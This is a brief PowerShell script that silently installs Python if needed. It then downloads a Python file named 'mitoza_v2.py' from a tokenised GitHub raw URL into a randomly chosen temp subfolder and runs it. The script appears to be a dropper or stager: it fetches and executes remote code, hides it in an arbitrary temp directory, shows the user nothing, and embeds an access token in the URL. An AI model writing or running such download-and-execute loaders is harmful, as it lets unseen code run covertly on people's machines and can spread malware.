try {
    python
}
catch {
    iwr https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe -OutFile "$env:USERPROFILE\downloads\python-3.12.8-amd64.exe"
    start "$env:USERPROFILE\downloads\python-3.12.8-amd64.exe" /quiet
}

$pth=(Get-ChildItem -Path $env:tmp -Directory -Name)
$irec=($pth[(Get-Random -Minimum 1 -Maximum ($pth | Measure-Object -Line).Lines)])
$direc = "$env:tmp\$irec"
iwr https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/mitoza_v2.py?token=GHSAT0AAAAAAC46SNMPZUYQ3LNM4MDZHJAUZ5CPWKA -outfile "$direc\mitoza.py"
start "$direc\mitoza.py"